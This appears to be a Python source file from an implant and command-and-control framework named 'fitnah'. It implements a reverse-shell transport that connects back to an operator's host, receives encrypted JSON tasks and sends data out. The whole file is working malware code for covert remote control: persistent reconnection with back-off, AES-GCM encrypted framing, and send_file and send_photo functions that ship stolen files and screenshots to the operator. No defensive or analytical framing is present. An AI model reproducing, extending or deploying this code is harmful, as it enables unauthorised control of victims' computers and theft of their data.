"""
reverse_shell.py — TCP reverse-shell fallback transport.

The operator starts a listener; this transport connects back to operator IP:port,
sends/receives JSON-encoded task messages (same schema as other transports),
and runs a persistent receive loop with exponential back-off reconnection.

Encryption: AES-256-GCM via ImplantCrypto if a key/secret is provided.
Wire framing: 4-byte big-endian length prefix + payload bytes.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import struct
from typing import AsyncIterator

from fitnah.c2.transport.base import AbstractTransport
from fitnah.implant.core.crypto import ImplantCrypto

log = logging.getLogger(__name__)

_BACKOFF_BASE = 2.0
_BACKOFF_MAX  = 60.0
_FRAME_HEADER = 4   # bytes for length prefix


class ReverseShellTransport(AbstractTransport):
    """
    Connects back to operator_host:operator_port via TCP.
    Falls back gracefully when the connection drops; reconnects with
    exponential back-off capped at 60 s.
    """

    name     = "reverse_shell"
    priority = 2          # lower than telegram (0) and discord (1)

    def __init__(
        self,
        host: str,
        port: int,
        crypto_secret: str = "",
        crypto_key: bytes | None = None,
        agent_id: str = "",
    ):
        self._host      = host
        self._port      = port
        self._agent_id  = agent_id or os.urandom(4).hex()
        self._alive     = False
        self._stopping  = False
        self._reader: asyncio.StreamReader | None  = None
        self._writer: asyncio.StreamWriter | None  = None
        self._recv_queue: asyncio.Queue[dict] = asyncio.Queue()
        self._recv_task: asyncio.Task | None   = None

        # optional encryption
        if crypto_key:
            self._crypto: ImplantCrypto | None = ImplantCrypto(key=crypto_key)
        elif crypto_secret:
            self._crypto = ImplantCrypto(secret=crypto_secret)
        else:
            self._crypto = None

    # ── lifecycle ─────────────────────────────────────────────────────────

    async def connect(self) -> None:
        """
        Establish the TCP connection with exponential back-off.
        Starts the persistent receive loop in the background.
        """
        self._stopping = False
        await self._connect_once()
        self._recv_task = asyncio.create_task(
            self._recv_loop(), name="revsh-recv"
        )

    async def _connect_once(self) -> None:
        """Attempt TCP connection; raise on failure."""
        log.info("[revsh] connecting to %s:%d", self._host, self._port)
        self._reader, self._writer = await asyncio.open_connection(
            self._host, self._port
        )
        self._alive = True
        log.info("[revsh] connected to %s:%d", self._host, self._port)

    async def disconnect(self) -> None:
        self._stopping = True
        self._alive    = False
        if self._writer:
            try:
                self._writer.close()
                await self._writer.wait_closed()
            except Exception:
                pass
            self._writer = None
            self._reader = None
        if self._recv_task and not self._recv_task.done():
            self._recv_task.cancel()
            try:
                await self._recv_task
            except (asyncio.CancelledError, Exception):
                pass
        log.info("[revsh] disconnected")

    # ── send ──────────────────────────────────────────────────────────────

    async def send(self, chat_id: str, text: str) -> None:
        """Send a plain text message wrapped in the standard envelope."""
        msg = {"chat_id": chat_id, "text": text, "_transport": self.name}
        await self._send_msg(msg)

    async def send_file(
        self, chat_id: str, filename: str, data: bytes, caption: str = ""
    ) -> None:
        import base64
        msg = {
            "chat_id":  chat_id,
            "filename": filename,
            "data_b64": base64.b64encode(data).decode(),
            "caption":  caption,
            "_transport": self.name,
        }
        await self._send_msg(msg)

    async def send_photo(self, chat_id: str, data: bytes, caption: str = "") -> None:
        await self.send_file(chat_id, "screenshot.png", data, caption or "screenshot")

    async def send_task(self, agent_id: str, message: dict) -> None:
        """Send a structured task dict to the implant."""
        envelope = {
            "agent_id":   agent_id,
            "message":    message,
            "_transport": self.name,
        }
        await self._send_msg(envelope)

    # ── receive ───────────────────────────────────────────────────────────

    async def receive(self) -> dict:
        """Block until a message arrives from the operator."""
        return await self._recv_queue.get()

    async def listen(self) -> AsyncIterator[dict]:
        """Yield messages as they arrive; reconnects transparently on drop."""
        while not self._stopping:
            try:
                msg = await asyncio.wait_for(self._recv_queue.get(), timeout=1.0)
                yield msg
            except asyncio.TimeoutError:
                continue

    # ── internal helpers ──────────────────────────────────────────────────

    async def _send_msg(self, msg: dict) -> None:
        if not self._writer or not self._alive:
            raise RuntimeError("[revsh] not connected")
        payload = json.dumps(msg).encode()
        if self._crypto:
            payload = self._crypto.encrypt(payload)
        frame = struct.pack(">I", len(payload)) + payload
        self._writer.write(frame)
        await self._writer.drain()

    async def _recv_frame(self) -> bytes:
        """Read one length-prefixed frame."""
        if not self._reader:
            raise ConnectionError("No reader")
        header = await self._reader.readexactly(_FRAME_HEADER)
        length = struct.unpack(">I", header)[0]
        return await self._reader.readexactly(length)

    async def _recv_loop(self) -> None:
        """
        Persistent receive loop.
        On disconnect: exponential back-off reconnect (max 60 s).
        """
        backoff = _BACKOFF_BASE
        while not self._stopping:
            try:
                raw = await self._recv_frame()
                if self._crypto:
                    try:
                        raw = self._crypto.decrypt(raw)
                    except Exception as exc:
                        log.warning("[revsh] decryption error: %s", exc)
                        continue
                try:
                    msg = json.loads(raw)
                except json.JSONDecodeError as exc:
                    log.warning("[revsh] bad JSON: %s", exc)
                    continue
                msg.setdefault("_transport", self.name)
                await self._recv_queue.put(msg)
                backoff = _BACKOFF_BASE  # reset on success

            except asyncio.CancelledError:
                break
            except Exception as exc:
                if self._stopping:
                    break
                log.warning("[revsh] connection lost: %s — retrying in %.0fs", exc, backoff)
                self._alive  = False
                self._writer = None
                self._reader = None
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, _BACKOFF_MAX)
                try:
                    await self._connect_once()
                except Exception as reconn_exc:
                    log.warning("[revsh] reconnect failed: %s", reconn_exc)
                    continue

        log.info("[revsh] receive loop exited")

    # ── status ────────────────────────────────────────────────────────────

    @property
    def is_alive(self) -> bool:
        return self._alive

    # ── convenience: start / stop wrappers ───────────────────────────────

    async def start(self, host: str | None = None, port: int | None = None) -> None:
        """Alternative to connect() that accepts host/port overrides."""
        if host:
            self._host = host
        if port:
            self._port = port
        await self.connect()

    async def stop(self) -> None:
        await self.disconnect()
